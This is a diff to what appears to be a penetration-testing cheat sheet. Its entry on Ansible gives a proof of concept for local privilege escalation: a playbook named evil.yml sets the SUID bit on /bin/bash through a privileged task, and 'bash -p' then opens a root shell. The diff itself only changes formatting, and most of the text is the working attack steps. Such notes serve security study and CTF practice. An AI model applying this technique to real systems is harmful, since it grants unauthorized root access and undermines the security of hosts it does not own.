@@ -1,7 +1,9 @@
 # Ansible
->If an ansible file is loaded by a root process : **Privilege Escalation**
+
+> If an ansible file is loaded by a root process : **Privilege Escalation**
 
 ## PoC
+
 ```bash
 # Create a .yml file just like the other one
 nano evil.yml
@@ -12,7 +14,10 @@ nano evil.yml
       command: chmod u+s /bin/bash
       become: true
 
-# save
+# ---
+# save the file CTRL+O CTRL+X
+# ---
+
 ls -lah /bin/bash
 ansible-playbook evil.yml
 bash -p
